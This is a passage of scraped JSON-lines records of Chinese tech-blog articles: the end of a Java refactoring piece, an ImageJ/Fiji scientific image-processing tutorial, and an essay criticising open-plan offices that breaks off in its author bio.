id=\"crayon-5a634cc71b240417199447-39\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-40\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-41\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getPostBenefitsSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-42\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-v\">YEARLY</span><span class=\"crayon-sy\">_</span>BONUS <span class=\"crayon-o\">-</span> <span class=\"crayon-v\">YEARLY_BENEFITS_DEDUCTIONS</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-43\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-44\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-45\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-46\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">SuccessfulFilter</span> <span class=\"crayon-r\">implements</span> <span class=\"crayon-e\">Predicate</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">Person</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-47\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-48\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">THRESHOLD</span><span class=\"crayon-sy\">_</span>AGE <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-49\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">THRESHOLD</span><span class=\"crayon-sy\">_</span>SALARY <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">60000.0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-50\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-51\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-52\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">boolean</span> <span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Person</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-53\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">THRESHOLD_AGE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getNetSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-v\">THRESHOLD_SALARY</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-54\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-55\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0071 seconds] -->\r\n<p>重新编译，然后测试，发现系统仍然如预期运行：我们没有改变外部行为，但我们已经改善了代码的内部结构和可靠性。想了解更多更复杂的重构方法和重构过程，请阅读 Martin Fowler 的<a href=\"https://www.amazon.com/Refactoring-Improving-Design-Existing-Code/dp/0201485672\" target=\"_blank\" rel=\"nofollow\">重构</a>，以及非常棒的<a href=\"https://refactoring.guru/\" target=\"_blank\" rel=\"nofollow\">重构大师网站</a>。</p>\n<h2>5. 让代码比你发现它的时候更好</h2>\n<p>最后的方法在概念上很简单，做起来却很难：让代码比你发现的时候更好。我们在梳理代码，特别是别人的代码时，我们倾向于添加功能，测试新功能，然后继续，而不会关注我们为其贡献代码的软件存在糟糕的代码，或者我们新添加到某个类的方法可能会造成混淆。因此，本文总的来说可以归纳为如下原则：</p>\n<blockquote><p>当我们对代码进行更改时，确保它会比我发现它的时候更好。</p></blockquote>\n<p>如前所述，现在我们在对所修改代码负责，如果它有问题，我们会负责修复问题。为了抵御生产软件带来的负面影响，我们必须强制自己动过的代码会比原来更好。我们偿还技术债务而不是回避问题，确保下一个接触到这段代码的人不需要付出代价，并对其产生兴趣。没人知道以后如何，也许我们以后会感谢自己的<strong>及时修补</strong>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113130\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113130votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113130\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/78311042527a7716a14c0a1eccd5b49d4931b8e9.jpg"}
{"url_object_id": "8ed0804ae6bd382f6ca9cf8d8ea52aba", "title": "Linux 上的科学图像处理", "url": "http://blog.jobbole.com/113171/", "create_date": "2017/12/04", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 1, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxjournal.com/content/image-processing-linux\">Joey Bernard</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9091-1.html\">Linux中国/XYenChi</a>   </div><p>在显示你的数据和工作方面我发现了几个科学软件，但是我不会涉及太多方面。因此在这篇文章中，我将谈到一款叫 ImageJ 的热门图像处理软件。特别的，我会介绍 <a href=\"https://imagej.net/Fiji\">Fiji</a>，这是一款绑定了一系列用于科学图像处理插件的 ImageJ 软件。</p>\n<p>Fiji 这个名字是一个循环缩略词，很像 GNU 。代表着 “Fiji Is Just ImageJ”。 ImageJ 是科学研究领域进行图像分析的实用工具 —— 例如你可以用它来辨认航拍风景图中树的种类。 ImageJ 能划分物品种类。它以插件架构制成，海量插件可供选择以提升使用灵活度。</p>\n<p>首先是安装 ImageJ （或 Fiji）。大多数的 ImageJ 发行版都可有该软件包。你愿意的话，可以以这种方式安装它，然后根据你的研究安装所需的独立插件。另一种选择是安装 Fiji 的同时获取最常用的插件。不幸的是，大多数 Linux 发行版的软件中心不会有可用的 Fiji 安装包。幸而，官网上的简单安装文件是可以使用的。这是一个 zip 文件，包含了运行 Fiji 需要的所有文件目录。第一次启动时，你只会看到一个列出了菜单项的工具栏。（图 1）</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/4b5323a323cdefe54748623ef51e9287.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 1. 第一次打开 Fiji 有一个最小化的界面。</em></p>\n<p>如果你没有备好图片来练习使用 ImageJ ，Fiji 安装包包含了一些示例图片。点击“File”-&gt;“Open Samples”的下拉菜单选项（图 2）。这些示例包含了许多你可能有兴趣做的任务。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/f6badbcda0fa0d6b1bbee8ffab23cf01.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 2. 案例图片可供学习使用 ImageJ。</em></p>\n<p>如果你安装了 Fiji，而不是单纯的 ImageJ ，那么大量插件也会被安装。首先要注意的是自动更新器插件。每次打开 ImageJ ，该插件将联网检验 ImageJ 和已安装插件的更新。</p>\n<p>所有已安装的插件都在“插件”菜单项中可选。一旦你安装了很多插件，列表会变得冗杂，所以需要精简你选择的插件。你想手动更新的话，点击“Help”-&gt;“Update Fiji” 菜单项强制检测并获取可用更新的列表（图 3）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/34164c1b61f5d6c5b4ab3cb14875ccb0.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 3. 强制手动检测可用更新。</em></p>\n<p>那么，现在，用 Fiji/ImageJ 可以做什么呢？举一例，统计图片中的物品数。你可以通过点击“File”-&gt;“Open Samples”-&gt;“Embryos”来载入示例。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cfee97aeff09774aadd91f6997833cd6.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 4. 用 ImageJ 算出图中的物品数。</em></p>\n<p>第一步给图片设定比例，这样你可以告诉 ImageJ 如何判别物品。首先，选择在工具栏选择线条按钮。然后选择“Analyze”-&gt;“Set Scale”，然后就会设置比例尺包含的像素点个数(图 5)。你可以设置“known distance ”为 100，单元为“um”。</p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6c891f88f41eabeffcb2588fcaf1ce90.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 5. 很多图片分析任务需要对图片设定一个范围。</em></p>\n<p>接下来的步骤是简化图片内的信息。点击“Image”-&gt;“Type”-&gt;“8-bit”来减少信息量到 8 比特灰度图片。要分隔独立物体点击“Process”-&gt;“Binary”-&gt;“Make Binary”以自动设置图片门限。(图 6)。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/02d9a149336105dbcd1c481282437ae8.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 6. 有些工具可以自动完成像门限一样的任务。</em></p>\n<p>图片内的物品计数前，你需要移除像比例尺之类的人工操作。可以用矩形选择工具来选中它并点击“Edit”-&gt;“Clear”来完成这项操作。现在你可以分析图片看看这里是啥物体。</p>\n<p>确保图中没有区域被选中，点击“Analyze”-&gt;“Analyze Particles”来弹出窗口来选择最小尺寸，这决定了最后的图片会展示什么（图 7）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/3cb08aa36ad4e4379b896c2aa1a3e636.png\" alt=\"\"></p>\n<p style=\"text-align: center\">*图 7. 你可以通过确定最小尺寸生成一个缩减过的图片。 *</p>\n<p>图 8 在总结窗口展示了一个概览。每个最小点也有独立的细节窗口。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/923cd604a9b9c69a21b07d1c35f433a7.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 8. 包含了已知最小点总览清单的输出结果。</em></p>\n<p>当你有一个分析程序可以工作于给定图片类型，你通常需要将相同的步骤应用到一系列图片当中。这可能数以千计，你当然不会想对每张图片手动重复操作。这时候，你可以集中必要步骤到宏，这样它们可以被应用多次。点击插件-&gt;“Macros”-&gt;“Record”，弹出一个新的窗口记录你随后的所有命令。所有步骤完成，你可以将之保存为一个宏文件，并且通过点击“Plugins”-&gt;“Macros”-&gt;“Run”来在其它图片上重复运行。</p>\n<p>如果你有非常特定的工作步骤，你可以简单地打开宏文件并手动编辑它，因为它是一个简单的文本文件。事实上有一套完整的宏语言可供你更加充分地控制图片处理过程。</p>\n<p>然而，如果你有真的有非常多的系列图片需要处理，这也将是冗长乏味的工作。这种情况下，前往“Process”-&gt;“Batch”-&gt;“Macro”，会弹出一个你可以设置批量处理工作的新窗口（图 9）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/1e4c9582d599e12de41f88309714d52e.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 9. 对批量输入的图片用单一命令运行宏。</em></p>\n<p>这个窗口中，你能选择应用哪个宏文件、输入图片所在的源目录和你想写入输出图片的输出目录。也可以设置输出文件格式，及通过文件名筛选输入图片中需要使用的。万事具备之后，点击窗口下方的的“Process”按钮开始批量操作。</p>\n<p>若这是会重复多次的工作，你可以点击窗口底部的“Save”按钮保存批量处理到一个文本文件。点击也在窗口底部的“Open”按钮重新加载相同的工作。这个功能可以使得研究中最冗余部分自动化，这样你就可以在重点放在实际的科学研究中。</p>\n<p>考虑到单单是 ImageJ 主页就有超过 500 个插件和超过 300 种宏可供使用，简短起见，我只能在这篇短文中提出最基本的话题。幸运的是，还有很多专业领域的教程可供使用，项目主页上还有关于 ImageJ 核心的非常棒的文档。如果你觉得这个工具对研究有用，你研究的专业领域也会有很多信息指引你。</p>\n<hr>\n<p>作者简介：</p>\n<p>Joey Bernard 有物理学和计算机科学的相关背景。这对他在新不伦瑞克大学当计算研究顾问的日常工作大有裨益。他也教计算物理和并行程序规划。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113171\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113171votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113171\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg"}
{"url_object_id": "499f1818f182ab7b7dc4ef8edaa89386", "title": "为什么我讨厌开放式办公？", "url": "http://blog.jobbole.com/113099/", "create_date": "2017/11/28", "front_img_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1flxjgvjhbrj21jk0qn127.jpg"], "praise_nums": 1, "comment_nums": 11, "favor_nums": 1, "tags": "职场,职场", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/@ummerr/youre-working-in-the-wrong-place-e289036ee01c\">ummerr</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><h3>物理空间中都有什么？</h3>\n<p>在我最近这份工作中，最好的作品都是在家完成的。我会尽可能避免在办公室工作。在家里，我拥有两张桌子和工作环境的完全控制权。无论是分心还是休息，都是我自己的选择，而不取决于外部因素。</p>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1flxjgvjhbrj21jk0qn127.jpg\"></p>\n<p style=\"text-align: center;\">我的家庭办公室是保护生产力的堡垒</p>\n<p>一旦我去了办公室，环境就都变了。总是有各种事物不停地使我分心：同事们、狗叫声（声明一点：狗狗很可爱）、临时会议、生日庆祝等等。这让我很难达到“<a href=\"https://www.ted.com/talks/mihaly_csikszentmihalyi_on_flow\">神驰状态</a>”（flow states: 将个人精力完全投注在某件事上），即使达到了，也很容易被打破。在我可以工作的所有场所中，办公室的桌子往往是最坏的一个选择。</p>\n<p>当我身处一个拥挤的空间，我的思维也变得拥挤了。我会不知所措，有种无法逃离的感觉。与之相反，如果我拥有精神和身体上的空间，我就能理解并挑战我的思维，思维质量也会大大提升。</p>\n<p>我意识到自己有点讨厌开放式办公。</p>\n<h3>开放式办公的兴起</h3>\n<blockquote><p>“我们鼓励大家待在开放的空间，因为我们相信这会带来一些意外的发现——而且大家会互相教授新的东西。”<em>(Jack Dorsey</em><em> </em><em>—</em><em> </em><em>pg. 49,</em><em> </em><a href=\"http://calnewport.com/books/deep-work/\"><em>Deep Work</em></a><em>)</em></p></blockquote>\n<p>理论上听起来是不错，大家都在同一个办公室里，不仅可以动态优化工作，还能极大地受益于协同作用。营销人员和设计师可以在“臭鼬工厂”项目（skunk works：指高级开发项目）中并肩工作，工程师和产品能瞬间提出并解决问题和bug，沟通可以在各个部门之间自然地进行。</p>\n<p><a href=\"http://nymag.com/scienceofus/2016/09/more-evidence-that-open-offices-make-people-less-social.html\">80%的办公室</a>都有开放办公的计划。传统公司也在朝这个方向发展，以期像那些酷酷的创业公司一样，为办公室注入更多创造力。</p>\n<p>挺有道理的哈？但是有一个大问题：</p>\n<h3>开放式办公是行不通的。</h3>\n<p>在阐述理由之前，我想说，我本人就是开放式办公的一大问题。我性格外向，如果让我在思考深入且复杂的问题和跟同事侃大山之中选一个，我肯定选后者。在这方面，<a href=\"http://waitbutwhy.com/2013/10/why-procrastinators-procrastinate.html\">我并不是一个人</a>。</p>\n<p>开放式办公环境中的人在<a href=\"http://www.newyorker.com/business/currency/the-open-office-trap\">几乎</a><a href=\"https://www.inc.com/geoffrey-james/why-your-company-will-benefit-from-getting-rid-of-open-office-spaces-first-90.html\">所有</a><a href=\"http://www.bbc.com/capital/story/20170105-open-offices-are-damaging-our-memories\">评估标准</a>上都受到了影响。一项Oil &amp; Gas公司在1997年的调查中显示：</p>\n<blockquote><p>“心理学家在更换为开放式办公以前、（开放式办公）四个星期后和六个月后这三个时间点，分别对员工的压力水平、工作表现、人际关系和对工作环境的满意度做了评估。员工们在每种评估标准上都遭受了负面影响：新的办公环境有“破坏性”，使人紧张且疲惫，不但没有感到人与人之间距离更近，反而更有距离感了，工作满意度降低了，不满情绪增加，生产力下降。”</p></blockquote>\n<p>和常规办公室相比，开放式办公的员工要经历更多不受控制的互动，更高的压力和更低的注意力和动力。研究也表明，开放式办公通常会<a href=\"https://theconversation.com/get-out-of-my-face-were-more-antisocial-in-a-shared-office-space-64734\">导致抵触社交的行为</a>。</p>\n<p><img class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1flxjgwabhxj21580rhwtj.jpg\"></p>\n<p style=\"text-align: center;\">Facebook的开放式办公使人感觉缺少了隐私空间</p>\n<p>虽然之前研究人员声称分享工作空间能提升社交支持、人与人之间的交流和合作，但是我们的研究结果表明，跟那些有自己的办公室的人，或者只和一两个人共享办公室的人相比，开放式办公同事之间的友谊质量是最低的。</p>\n<p>开放式办公会不可避免地增加噪音，被视为生产力和专注力的一大障碍。物理上的分隔也可以给人一种隐私的感觉——办公室里<a href=\"http://www.newyorker.com/business/currency/the-open-office-trap\">有隐私感被证明可以提升工作表现</a>。</p>\n<p>开放式办公室是很差的结构。它在设计和心理上都表现出了同样的失败。为了理解为什么开放式办公如此普遍，我们必须了解基本的心理学和理论基础。</p>\n<p>下面概述了开放式办公最常见的论点：</p>\n<h3>自发的创造力优于注意力</h3>\n<ul>\n<li>观点：在大办公室里的人自然会提升自发的合作和创造力。</li>\n<li><strong>反驳观点</strong>：这些偶然的创新想法事实上多久才能出现一次？即使有很多创新的想法，你的公司结构是否允许这些想法被有效利用？你优化的是一个长尾事件，而牺牲的确是每个员工都能从中受益的东西——专注力。</li>\n</ul>\n<h3>忙碌程度代表生产力</h3>\n<ul>\n<li><strong>观点</strong>：大家都在同一个房间，就会受到激励，做更多的工作，因为别人能看到他们在做什么。</li>\n<li><strong>反驳观点</strong>：这是一个超烂的工作表现评估标准。一个经理会用员工工作的物理位置来评价他们，是因为他没什么办法或能力来衡量他们的产出。如果你评价一个人的价值是看他有多忙，那只能说祝你好运了。</li>\n</ul>\n<p><em>搬运自 </em><em>Cal Newport（美国一位教育学家）</em><em>的 </em><a href=\"http://calnewport.com/books/deep-work/\"><em>Deep Work</em></a></p>\n<h3>成本效率</h3>\n<ul>\n<li><strong>观点</strong>：不用给每个人建一座办公室，可以省很多钱。</li>\n<li><strong>反驳观点</strong>：好吧，你花了一大笔钱钱去雇有才能的工程师、设计师，然后把他们放在让他们一直分心的工作环境里，真是令人窒息的操作。</li>\n</ul>\n<p>开放式办公也给员工们一种认知，那就是他们一直在主动或被动地被监视着，这能鼓励员工们看起来很忙碌且富有成效。</p>\n<p>我们看起来更忙了，但是实际上效率更低，要请更多的病假，沟通和快乐的心情都被毁了，这不是什么聪明的交易。</p>\n<h2>可选方案</h2>\n<p>我们应该努力为有意义的工作创造更好的环境。 关于这点有许多概念，我的最爱的包括：</p>\n<p><strong>轮辐式模型（</strong><strong>Hub and Spoke</strong><strong>）</strong></p>\n<p>两全其美的选择，轮辐式空间的特点是有一个进入公共空间和走廊的入口，可以与不同的个人办公室对接。</p>\n<p>人们可以选择一起工作或在自己的办公室里独自工作。 “轮子”中心和“辐条”有大型的公共空间和走廊需要通行，鼓励了同行时的对话。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1flxjgxc8rjj20rw0jbe81.jpg\"></p>\n<p style=\"text-align: center;\">MIT 20号楼空中视角/所有的办公室和一个中心入口</p>\n<p>MIT 20号楼是轮辐式模型的一个著名例子。20号楼因为促成了很多有创意的想法而闻名。这其中有一部分要归功于建筑的独特结构。<a href=\"https://www.nytimes.com/2016/08/07/education/edlife/innovation-campus-entrepreneurship-engineering-arts.html\">走廊和楼梯才是创意碰撞的场所</a>，而不是几个人一起坐在三角椅上想出来的。</p>\n<p>极乐机（<strong>Eudaimonia Machine</strong>）</p>\n<p>Eudaimonia 在希腊语中是“可以发挥人全部潜能的状态”的意思。我在Cal Newport的<a href=\"http://calnewport.com/books/deep-work/\">Deep Work</a>（《深度工作》）中得知了极乐机（由David Dewane独创的成果）。</p>\n<p>极乐机由五个房间组成，每个房间都比前一个房间更适于专注的工作。</p>\n<p>陈列室</p>\n<p>从街上走进的第一个房间是陈列室。在<em>Dewane</em>的设计中，这个房间会展示这座建筑中产出深度工作。它的目的是激励当中的“用户”，创造健康压力和同伴压力文化。</p>\n<p>沙龙</p>\n<p>沙龙的设计目的是创造一种“在强烈的好奇和争论之间盘旋”的气氛。这是个供人争论、“孵化”想法的地方，可以把日常的工作想法想得更深远。</p>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1flxjgxxb74j218g0pzq53.jpg\"></p>\n<p style=\"text-align: center;\">极乐机结构简图</p>\n<p>图书馆</p>\n<p>走出大厅，就进入图书馆了。这个空间永久保存着这台机器中产出的所有工作成果，和用于从前工作的书籍和资源。</p>\n<p>办公空间</p>\n<p>下一个房间是办公空间。其中包括一个标准会议室，里面有一块白板，还有一些带桌子的隔间。“办公区是为低强度活动设置的”Dewane解释道。</p>\n<p>工作室</p>\n<p>现在到了机器中的最后一个空间了，有多个被Dewane称为“深度工作室”的房间。“每个工作间的规格大约是六英尺乘十英尺（一英尺约为0.3米），被厚厚的隔音墙围住……”深入工作间的目的是使员工能全身心投入工作，不受打扰。</p>\n<p>这里有关于极乐机的<a href=\"http://strongproject.com/blog/how-cal-newports-deep-work-concept-will-influence-office-design/\">深入探讨</a>。虽然相较概念，这个品牌可能更有名一些，但是我是这个概念的忠实粉丝。</p>\n<p><strong>作家的小木屋</strong></p>\n<p>也许你在一家很独断的创业公司工作，或者你的情况不允许你对工作环境和结构做调整。不能掌控你的工作环境会让工作更难完成。</p>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1flxjgys0h8j20bv082my9.jpg\"></p>\n<p style=\"text-align: center;\">迪伦·托马斯（Dylan Thomas）在威尔士拉恩镇的写作小屋</p>\n<p><em>但你还是要把工作做完。</em></p>\n<p>找到属于你的“作家的小屋”，看看在哪里你能认真地，不受打扰地工作，可以是咖啡厅、图书馆或者<a href=\"http://mentalfloss.com/article/53235/how-stephen-kings-wife-saved-carrie-and-launched-his-career\">你家后面的洗衣房</a>。你的“小屋”是你能做好工作的地方。</p>\n<h3>你的解决方案？</h3>\n<p>对自己进行审查，找出你何时最有效率，最能达到神驰状态。这种审查很有帮助，因为我们做事经常看起来合乎逻辑，而实际上适得其反。查看工作产出这件事非常值得你为之付出一些时间。</p>\n<p>在开放式办公环境中，你有做出你最好的工作成果吗？</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/07/acb658caeaa7401d5d7d20f28a1eab52.png\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113099\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113099votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113099\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 11 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">刘唱</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/5f17a18404975a50e3a341f2f8e27d59.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            数据挖掘研究生        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/liuchang\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/liuchang/\" target=\"_blank\"><i class=\"fa 